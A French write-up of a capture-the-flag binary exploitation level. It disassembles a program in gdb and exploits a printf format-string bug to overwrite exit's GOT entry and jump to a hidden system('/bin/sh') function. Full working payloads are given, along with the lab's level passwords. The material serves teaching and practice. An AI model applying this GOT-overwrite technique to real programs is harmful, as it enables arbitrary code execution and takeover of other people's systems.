On se connecte sur le level5, ou se trouve un **binaire** <code>level5</code>.

On cherche a savoir ce que fait ce binaire:
```gdb
> gdb level5 -q
Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
(gdb) > disas main
Dump of assembler code for function main:
   0x08048504 <+0>:     push   %ebp
   0x08048505 <+1>:     mov    %esp,%ebp
   0x08048507 <+3>:     and    $0xfffffff0,%esp
   0x0804850a <+6>:     call   0x80484c2 <n>
   0x0804850f <+11>:    leave
   0x08048510 <+12>:    ret
End of assembler dump.
(gdb) > disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
```
En regardant les fonctions utlisées, on trouve :

```gdb
(gdb) i functions
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  system
0x080483b0  system@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  exit
0x080483d0  exit@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
```
On trouve une fonction **o** non-utilisé dont l'adresse est **0x080484a4**:

```gdb
(gdb) > disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
```
On va donc chercher à overflow sur le printf dans **n** pour pouvoir arriver sur **o** qui lancera un <code>/bin/sh</code>.

On cherche l'**offset** :
<pre><code>
> python -c 'print "AAAA" + "|%08x" * 4' | ./level5
AAAA|00000200|b7fd1ac0|b7ff37d0|41414141
</code></pre>
>Ici 4

On cherche ensuite l'adresse d'**exit**:
```gdb
(gdb) > disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
   0x080483d6 <+6>:	push   0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
```
> Ici 0x8049838

On vérifie qu'on arrive à modifier l'adresse:
<pre><code>
> python -c 'print "\x38\x98\x04\x08" + "%4$08n"' > /tmp/payload3
(gdb) > -q level5
Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
(gdb) > set disassembly-flavor intel
(gdb) > disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   ebp
   0x080484c3 <+1>:	mov    ebp,esp
   0x080484c5 <+3>:	sub    esp,0x218
   0x080484cb <+9>:	mov    eax,ds:0x8049848
   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:	lea    eax,[ebp-0x208]
   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    eax,[ebp-0x208]
   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) >  b * 0x080484f3
Breakpoint 1 at 0x80484f3
(gdb) >  b * 0x080484ff
Breakpoint 2 at 0x80484ff
(gdb) > run < /tmp/payload3
Starting program: /home/user/level5/level5 < /tmp/payload3

Breakpoint 1, 0x080484f3 in n ()
(gdb) > disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
   0x080483d6 <+6>:	push   0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
(gdb) > x/x 0x8049838
0x8049838 <exit@got.plt>:	0x080483d6
(gdb) continue
Continuing.
8�

Breakpoint 2, 0x080484ff in n ()
(gdb) > x/x 0x8049838
0x8049838 <exit@got.plt>:	0x00000004
</code></pre>
> D'un breakpoint à l'autre (entre printf et exit) la valeur a bien été modifée.

## Résolution 1

Notre objectif étant **0x080484a4** on lui soustrait la valeur déjà existante dans exit on obtien la taille de champ a ajouter.
```gdb
(gdb) > p 0x080484a4 - 4
$1 = 134513824
```

<pre><code>
> (python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$08n"'; cat) | ./level5
...
cd ../level6 && cat .pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
</code></pre>

Cependant le résultat n'apparait pas avant un long moment (affichage des 134.513.824 espaces) c'est pourquoi une deuxième façon de faire est plus pratique.

## Résolution 2
Pour simplifier et afficher moins de taille de champ, on coupe l'adresse en 2 parties.
```
0x8049838 <exit@got.plt>:       0x080483d6
(gdb) quit
0x08           04           83           d6
0x0x804983b    0x804983a    0x8049839    0x8049838
```
Les parties sont :
<pre><code>0x804983a: 0x0804
0x8049838: 0x83d6 
</code></pre>
L'objectif étant **0x080484a4** soit **0x0804 | 0x84a4**, seule la 2ème partie a besoin d'être modifée.
On essaie à nouveau de modifier la valeur mais partie par partie:
<pre><code>python -c 'print "\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%4$hn" + "%5$hn"' > /tmp/test
(gdb) > run < /tmp/test
Starting program: /home/user/level5/level5 < /tmp/test

Breakpoint 1, 0x080484f3 in n ()
(gdb) > disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
   0x080483d6 <+6>:	push   0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
(gdb) > x/x 0x8049838
0x8049838 <exit@got.plt>:	0x080483d6
(gdb) > continue
Continuing.
8:�

Breakpoint 2, 0x080484ff in n ()
(gdb) > x/x 0x8049838
0x8049838 <exit@got.plt>:	0x00080008
</code></pre>
Les partie sont modifiées et initialisées à 8 on calcule donc la différence avec l'objectif et on applique.
```gdb
(gdb) > p 0x84a4 - 0x8
$1 = 33948
```
Auquel il faut rajouter 4 si on ne met pas la premiere partie dans la commande.
<pre><code> > (python -c 'print "\x38\x98\x04\x08" + "%33952d" + "%4$hn"'; cat) | ./level5
cd ../level6 && cat .pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
</code></pre>

For download :
<pre><code>scp -P4242 level5@IP:level5 .</code></pre>
> Password : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
